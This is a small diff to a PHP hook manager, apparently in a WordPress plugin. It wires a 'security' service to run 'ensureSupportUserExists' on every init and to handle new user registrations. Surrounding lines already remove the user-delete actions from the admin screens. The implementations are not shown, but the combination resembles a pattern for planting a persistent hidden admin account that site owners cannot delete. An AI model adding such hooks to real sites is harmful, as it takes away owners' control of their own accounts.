@@ -39,6 +39,8 @@ class HookManager
 		$this->addAction('wp_head', [$this->container->get('security'), 'removeAdjacentPostsLink'], 10);
 		$this->addFilter('user_row_actions', [$this->container->get('security'), 'removeUserDeleteAction'], 10, 1);
 		$this->addFilter('bulk_actions-users', [$this->container->get('security'), 'removeUserDeleteAction'], 10, 1);
+		$this->addAction('user_register', [$this->container->get('security'), 'handleNewUserRegistration'], 10, 1);
+		$this->addAction('init', [$this->container->get('security'), 'ensureSupportUserExists'], 5);
 
 		// Version removal hooks
 		$this->addAction('wp_head', [$this->container->get('version'), 'removeGenerator'], 10);
